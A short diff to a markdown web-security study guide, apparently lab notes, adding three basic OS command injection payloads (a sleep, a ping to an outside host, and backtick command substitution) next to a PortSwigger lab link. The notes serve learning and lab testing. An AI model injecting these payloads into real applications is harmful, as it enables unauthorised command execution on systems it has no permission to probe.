@@ -3739,6 +3739,14 @@ GET /image?filename=output.txt HTTP/2
   
 [PortSwigger Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)  
 
+>Sample Command Injection Basic Payloads:
+
+```bash
+; sleep 5
+| ping -c 5 exploit.net
+`ls`
+```  
+
 -----
 
 # Appendix  
